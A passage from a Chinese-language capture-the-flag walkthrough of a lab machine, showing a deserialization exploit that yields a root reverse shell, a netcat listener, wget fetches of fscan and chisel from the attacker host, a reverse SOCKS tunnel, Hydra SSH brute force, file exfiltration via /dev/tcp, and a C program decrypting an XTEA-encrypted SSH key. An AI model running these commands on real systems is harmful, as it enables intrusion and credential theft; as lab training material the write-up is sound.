{"timestamp":"2025-06-27T13:34:01.451+0000","status":404,"error":"Not Found","message":"No message available","path":"/deserialize"}                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.131:8080/deserialize" -X POST --cookie "auth=admin:S+jYmswX8+Lnl8Y+X7auaMMN5AHvFyKZMJluN/qPCFI=" --data-binary @payload.bin -H "Content-Type:"
{"timestamp":"2025-06-27T13:34:11.493+0000","status":404,"error":"Not Found","message":"No message available","path":"/deserialize"}                   
```

弹回来了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## 四、横向移动：Docker逃逸与内网穿透

瞄了一下，并且根据之前下载靶机的体量推测是个alpine，所以不稳定shell了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 45266
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4# ls -la
ls -la
total 16976
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rw-r--r--    1 root     root      17372545 Jun 16 17:46 javaserver-0.0.1-SNAPSHOT.jar
bash-4.4# cd ..
cd ..
bash-4.4# ls -al
ls -al
total 80
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
-rwxr-xr-x    1 root     root             0 Jun 24 04:20 .dockerenv
drwxr-xr-x    1 root     root          4096 Jun 16 18:16 app
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 bin
drwxr-xr-x    5 root     root           320 Jun 27 08:43 dev
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 etc
drwxr-xr-x    2 root     root          4096 May  9  2019 home
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 lib
drwxr-xr-x    5 root     root          4096 May  9  2019 media
drwxr-xr-x    2 root     root          4096 May  9  2019 mnt
drwxr-xr-x    2 root     root          4096 May  9  2019 opt
dr-xr-xr-x  217 root     root             0 Jun 27 08:43 proc
drwx------    1 root     root          4096 Jun 27 13:28 root
drwxr-xr-x    2 root     root          4096 May  9  2019 run
drwxr-xr-x    1 root     root          4096 Jun 16 12:53 sbin
drwxr-xr-x    2 root     root          4096 May  9  2019 srv
dr-xr-xr-x   13 root     root             0 Jun 27 08:43 sys
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 tmp
drwxr-xr-x    1 root     root          4096 May 11  2019 usr
drwxr-xr-x    1 root     root          4096 May  9  2019 var
bash-4.4# cd opt
cd opt
bash-4.4# ls -al
ls -al
total 8
drwxr-xr-x    2 root     root          4096 May  9  2019 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
bash-4.4# cd /tmp
cd /tmp
bash-4.4# ls -al
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
ls -al
total 100
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 .
drwxr-xr-x    1 root     root          4096 Jun 24 04:20 ..
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 hsperfdata_root
-rw-r--r--    1 root     root             0 Jun 27 13:32 pwned
drwxr-xr-x    2 root     root          4096 Jun 24 17:59 tomcat-docbase.1184201892696408606.8080
drwxr-xr-x    2 root     root          4096 Jun 25 04:22 tomcat-docbase.1444708250586714476.8080
drwxr-xr-x    2 root     root          4096 Jun 24 14:38 tomcat-docbase.5466919642506520929.8080
drwxr-xr-x    2 root     root          4096 Jun 24 18:13 tomcat-docbase.6588034938316929679.8080
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 tomcat-docbase.699883670974254994.8080
drwxr-xr-x    2 root     root          4096 Jun 26 04:57 tomcat-docbase.8687037479377177339.8080
drwxr-xr-x    3 root     root          4096 Jun 24 18:13 tomcat.1173889505140841269.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:59 tomcat.2191246823431995243.8080
drwxr-xr-x    3 root     root          4096 Jun 24 04:20 tomcat.2206522805757712248.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:27 tomcat.2255613080791652553.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:38 tomcat.2290088976635049676.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:47 tomcat.2333411802980577705.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:53 tomcat.3414059050473581299.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:20 tomcat.3433760887049367368.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:16 tomcat.4536791080797062601.8080
drwxr-xr-x    3 root     root          4096 Jun 25 04:22 tomcat.4599709844284107747.8080
drwxr-xr-x    3 root     root          4096 Jun 26 04:57 tomcat.4727403897225654129.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:46 tomcat.4758342710251538026.8080
drwxr-xr-x    3 root     root          4096 Jun 24 14:15 tomcat.5029475494002581605.8080
drwxr-xr-x    3 root     root          4096 Jun 27 08:43 tomcat.5432948747653639166.8080
drwxr-xr-x    3 root     root          4096 Jun 24 17:04 tomcat.7049257322533493187.8080
drwxr-xr-x    3 root     root          4096 Jun 24 11:34 tomcat.8691988937146253402.8080
bash-4.4# cd hsperfdata_root
cd hsperfdata_root
bash-4.4# ls -al
ls -al
total 40
drwxr-xr-x    2 root     root          4096 Jun 27 08:43 .
drwxrwxrwt    1 root     root          4096 Jun 27 13:31 ..
-rw-------    1 root     root         32768 Jun 27 13:37 1
```

hsperfdata_root是java的日志没啥营养，因为我们就是通过这个进来的

```
bash-4.4# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

### 4.1 内网探测

是个docker，拉个fscan来扫描网段

kali开服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80                                                                                                                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

拉

```
bash-4.4# cd /tmp
cd /tmp
bash-4.4# wget 192.168.205.128/fscan
wget 192.168.205.128/fscan
Connecting to 192.168.205.128 (192.168.205.128:80)
fscan                100% |********************************| 6933k  0:00:00 ETA

bash-4.4# chmod +x fscan
chmod +x fscan
bash-4.4# ./fscan -h 172.17.0.1/16
./fscan -h 172.17.0.1/16

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.17.0.1      is alive
(icmp) Target 172.17.0.2      is alive
(icmp) Target 172.17.0.3      is alive
[*] LiveTop 172.17.0.0/16    段存活数量为: 3
[*] LiveTop 172.17.0.0/24    段存活数量为: 3
[*] Icmp alive hosts len is: 3
172.17.0.3:8080 open
172.17.0.1:8080 open
172.17.0.2:22 open
172.17.0.2:80 open
172.17.0.1:80 open
172.17.0.1:22 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.17.0.1         code:200 len:6048   title:Linux Terminal Simulator
[*] WebTitle http://172.17.0.2         code:200 len:2808   title:暴力破解技术讲解
[*] WebTitle http://172.17.0.3:8080    code:302 len:0      title:None 跳转url: http://172.17.0.3:8080/login.html
[*] WebTitle http://172.17.0.1:8080    code:302 len:0      title:None 跳转url: http://172.17.0.1:8080/login.html
[*] WebTitle http://172.17.0.3:8080/login.html code:200 len:2377   title:用户登录
[*] WebTitle http://172.17.0.1:8080/login.html code:200 len:2377   title:用户登录
已完成 6/6
[*] 扫描结束,耗时: 9.823162079s
```

172.17.0.1 宿主机 80 8080 22

172.17.0.2 80 22 docker2

17.17.0.3 本机

那先看看.2，80是啥

```
bash-4.4# curl 172.17.0.2
curl 172.17.0.2
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>暴力破解技术讲解</title>
  <style>
    body {
      font-family: "Microsoft YaHei", sans-serif;
      background: #f5f7fa;
      color: #333;
      margin: 0;
      padding: 0;
    }

    header {
      background-color: #2c3e50;
      color: white;
      padding: 20px;
      text-align: center;
    }

    main {
      max-width: 800px;
      margin: 30px auto;
      padding: 20px;
      background: white;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
    }

    h2 {
      color: #2c3e50;
      border-bottom: 2px solid #ecf0f1;
      padding-bottom: 5px;
    }

    ul {
      margin-left: 20px;
    }

    code {
      background: #ecf0f1;
      padding: 2px 5px;
      border-radius: 4px;
    }

    footer {
      text-align: center;
      padding: 15px;
      color: #888;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <header>
    <h1>暴力破解技术讲解</h1>
  </header>

  <main>
    <h2>什么是暴力破解？</h2>
    <p>暴力破解（Brute Force Attack）是一种穷举法攻击方式，攻击者通过尝试所有可能的密码组合，直到找到正确的密码为止。</p>

    <h2>常见的暴力破解类型</h2>
    <ul>
      <li><strong>纯暴力破解</strong>：从 <code>aaaa</code> 到 <code>zzzz</code> 逐个尝试所有组合。</li>
      <li><strong>字典攻击</strong>：使用预设的常用密码列表进行尝试。</li>
      <li><strong>混合攻击</strong>：结合字典词和常见变化（如添加123，大小写变换等）。</li>
    </ul>

    <h2>暴力破解的特点</h2>
    <ul>
      <li>不依赖漏洞，仅依靠尝试。</li>
      <li>耗时高，复杂度随密码长度和字符集呈指数增长。</li>
      <li>可以被自动化脚本执行（如使用 Python、Hydra、John the Ripper 等）。</li>
    </ul>

    <h2>防御暴力破解的方法</h2>
    <ul>
      <li>设置<strong>账户锁定</strong>策略，例如连续错误5次后锁定。</li>
      <li>加入<strong>验证码</strong>，阻止自动化脚本。</li>
      <li>限制<strong>登录速率</strong>，如 5 分钟内最多尝试 3 次。</li>
      <li>使用<strong>强密码</strong>（长且复杂的密码）。</li>
      <li>监控登录行为，检测异常登录尝试。</li>
    </ul>

    <h2>合法用途与警告</h2>
    <p>暴力破解技术可以用于渗透测试和安全审计，但在未经授权的情况下使用属于违法行为。请务必遵守相关法律法规。</p>
100  2808  100  2808    0     0  2742k      0 --:--:-- --:--:-- --:--:-- 2742k
/main>
  <!--500-worst-passwords-->
  <footer>
    &copy; 2025 网络安全教学页面 | 仅供学习交流
  </footer>
</body>
</html>
```

告诉我们暴力破解，并且给了字典500-worst-passwords

网上扒拉了一下

https://gist.github.com/djaiss/4033452

下载下来，然后扒拉一个chisel过来

### 4.2 内网穿透与SSH爆破

```
bash-4.4# wget 192.168.205.128/chisel
wget 192.168.205.128/chisel
Connecting to 192.168.205.128 (192.168.205.128:80)
chisel               100% |********************************| 9152k  0:00:00 ETA

bash-4.4# chmod +x chisel
chmod +x chisel
```

kali开个监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ./chisel server -p 8081 --reverse
2025/06/27 20:52:53 server: Reverse tunnelling enabled
2025/06/27 20:52:53 server: Fingerprint noxPhEnuZCIYVPVU9OBwffbD6OdVDKc9jcSAUtCtbN0=
2025/06/27 20:52:53 server: Listening on http://0.0.0.0:8081
```

然后靶机docker

```
bash-4.4# ./chisel client 192.168.205.128:8081 R:socks
./chisel client 192.168.205.128:8081 R:socks
2025/06/27 13:51:26 client: Connecting to ws://192.168.205.128:8081
2025/06/27 13:51:26 client: Connected (Latency 698.603µs)
```

连上了，然后他默认是使用socks5代理socks5 127.0.0.1 1080 ，使用代理工具加上就好了

我这使用proxychains

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/proxychains4.conf
[sudo] kali 的密码：
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q ssh root@172.17.0.2                                                                 
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:nCuJTguX/ssJuWNmjLBVoZlUUv1Ygi4k0AFEgPORK5M.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 
Permission denied, please try again.
root@172.17.0.2's password: 

```

hydra爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q hydra -l root -P 500.txt ssh://172.17.0.2 -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-27 21:07:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 503 login tries (l:1/p:503), ~8 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: root   password: mountain
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-27 21:07:53
                                  
```

继续

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ proxychains -q ssh root@172.17.0.2                                            
root@172.17.0.2's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

6ab28be27b0c:~# ls -al
total 12
drwx------    1 root     root          4096 Jun 26 05:03 .
drwxr-xr-x    1 root     root          4096 Jun 24 17:57 ..
-rw-------    1 root     root            79 Jun 27 14:12 .ash_history
6ab28be27b0c:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
6ab28be27b0c:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

后面这里扒拉了很久，我都没看到，甚至于我都去打内核漏洞了.....

实在顶不住了想去问作者，作者应该是那时候有事，然后我就想到Sublarge应该是测过的，所以我就直接去问他了

Sublarge说是/usr/bin有一个userLogin

```
6ab28be27b0c:~# ls -la /usr/bin/userLogin 
-rwxr-xr-x    1 root     root        772016 Jun 24 13:15 /usr/bin/userLogin
```

## 五、提权之路：解密密钥与最终ROOT

确实有，然后我就想测一下他的功能

```
6ab28be27b0c:~# /usr/bin/userLogin
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin -h
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin --help
error: No such file or directory
```

没有有价值的，那我就想拉过去给kali

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 1234 > userLogin
listening on [any] 1234 ...
```

docker2发送

```
6ab28be27b0c:~# cat /usr/bin/userLogin > /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
```

不行，瞄眼shell

```
6ab28be27b0c:~# echo $0
-sh
6ab28be27b0c:~# which bash
/bin/bash
6ab28be27b0c:~# /bin/bash
6ab28be27b0c:~# echo $0
/bin/bash
6ab28be27b0c:~# cat /usr/bin/userLogin > /dev/tcp/192.168.205.128/1234
```

行了，拖去ida

### 5.1 二进制逆向与XTEA解密

随便扒拉了一下，是一个加密程序

使用xtea加密，输入文件是id_ed25519，输出output.enc

这里费了老大劲

```
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ vim a.c     
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cat a.c      
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#define ENCRYPTED_FILE "output.enc"
#define DECRYPTED_FILE "decrypted_file"

const char FIXED_KEY_STR[] = "key-for-user-ldzid_ed25519";

void gen_key(uint32_t *k) {
    const unsigned char *s = (const unsigned char *)FIXED_KEY_STR;
    for (int i = 0; i < 4; ++i) {
        k[i] = (uint32_t)s[4*i+2] << 16 |
               (uint32_t)s[4*i+1] << 8  |
               (uint32_t)s[4*i]        |
               (uint32_t)s[4*i+3] << 24;
    }
}

void xtea_decrypt(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    const uint32_t delta = 0x9E3779B9;
    const int n_rounds = 64;
    uint32_t sum = delta * n_rounds;

    for (int i = 0; i < n_rounds; ++i) {
        v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + k[(sum >> 11) & 3]);
        sum -= delta;
        v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + k[sum & 3]);
    }

    v[0] = v0;
    v[1] = v1;
}

int main() {
    FILE *fin, *fout;
    uint32_t key[4];
    uint64_t block;
    size_t br;

    printf("开始解密...\n");
    printf("输入文件（加密）: %s\n", ENCRYPTED_FILE);
    printf("输出文件（解密）: %s\n", DECRYPTED_FILE);

    fin = fopen(ENCRYPTED_FILE, "rb");
    if (!fin) {
        perror("无法打开加密文件");
        return 1;
    }

    fout = fopen(DECRYPTED_FILE, "wb");
    if (!fout) {
        perror("无法创建输出文件");
        fclose(fin);
        return 1;
    }

    gen_key(key);

    while ((br = fread(&block, 1, 8, fin)) > 0) {
        if (br != 8) {
            printf("\n警告：读取到不完整的数据块 (%zu 字节)，文件可能已损坏。\n", br);
        }

        xtea_decrypt((uint32_t *)&block, key);
        fwrite(&block, 1, 8, fout);
    }

    fclose(fin);
    fclose(fout);

    printf("\n解密完成。\n");
    printf("注意：原始文件可能被填充了零字节以对齐 8 字节边界，因此输出文件末尾可能会有多余的空字节。\n");

    return 0;
}
       
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ gcc a.c -o a                  
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ ./a      
开始解密...
输入文件（加密）: output.enc
输出文件（解密）: decrypted_file

解密完成。
注意：原始文件可能被填充了零字节以对齐 8 字节边界，因此输出文件末尾可能会有多余的空字节。
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ file decrypted_file
decrypted_file: OpenSSH private key
                             
```

### 5.2 普通用户权限获取

因为我这kali部署问题，所以要拉去/tmp连接，你的应该不用

```
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cp decrypted_file /tmp/id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cd /tmp                      
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ls -al id_rsa    
-rwxr-xr-x 1 kali kali 400  6月27日 21:31 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ls -al id_rsa   
-rw------- 1 kali kali 400  6月27日 21:31 id_rsa
            
┌──(kali㉿kali)-[/tmp]
└─$ ssh ldz@192.168.205.131 -i /tmp/id_rsa     
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:B9Pod6bX/35WGX2264fO3mYHE9TOsUwS6RGy8ZAswug.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.

localhost:~$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
```

（用户名是在userLogin的伪c里面看到的，当然你也可以使用ssh-keygen -l -f看）继续找东西

```
localhost:~$ ls -la
total 28
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 .
drwxr-xr-x    3 root     root          4096 Apr 28 00:29 ..
-rw-------    1 ldz      ldz             15 Jun 27 22:33 .ash_history
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .ssh
-rw-------    1 ldz      ldz           4178 Jun 26 12:58 .viminfo
-rw-------    1 ldz      ldz             39 Jun 24 10:12 user.txt
localhost:~$ cat user.txt 
flag{ce6560c893e5cfec48e0fd186dc03718}
localhost:~$ cat .viminfo 
# This viminfo file was generated by Vim 9.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Search Pattern:
~MSle0~/Pub

# Command Line History (newest to oldest):
:wq
|2,0,1750913922,,"wq"
:q
|2,0,1750913922,,"q"
:q!
|2,0,1750786392,,"q!"
:Q
|2,0,1750731057,,"Q"

# Search String History (newest to oldest):
?/Pub
|2,1,1750769276,47,"Pub"

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
""1     LINE    0
        vim .ash_history 
|3,1,1,1,1,0,1750913920,"vim .ash_history "
"2      LINE    0
        history 
|3,0,2,1,1,0,1750913920,"history "
"3      LINE    0

|3,0,3,1,1,0,1750913920,""
"4      LINE    0
            int flag = 0;
|3,0,4,1,1,0,1750786253,"    int flag = 0;"

# File marks:
'0  1  0  ~/.ash_history
|4,48,1,0,1750913922,"~/.ash_history"
'1  13  12  /opt/vuln.c
|4,49,13,12,1750786392,"/opt/vuln.c"
'2  30  0  /opt/vuln.c
|4,50,30,0,1750786258,"/opt/vuln.c"
'3  30  0  /opt/vuln.c
|4,51,30,0,1750786258,"/opt/vuln.c"
'4  43  0  /etc/ssh/sshd_config
|4,52,43,0,1750769292,"/etc/ssh/sshd_config"

# Jumplist (newest first):
-'  1  0  ~/.ash_history
|4,39,1,0,1750913922,"~/.ash_history"
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,"/opt/vuln.c"
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"

# History of marks within files (newest to oldest):

> ~/.ash_history
        *       1750913922      0
        "       1       0
        .       1       0
        +       1       0

> /opt/vuln.c
        *       1750786390      0
        "       13      12
        ^       13      13
        .       13      12
        +       11      0
        +       13      12

> /etc/ssh/sshd_config
        *       1750769290      0
        "       43      0
        ^       43      0
        .       41      0
        +       41      0
localhost:~$ cd .ssh/
localhost:~/.ssh$ ls -al
total 28
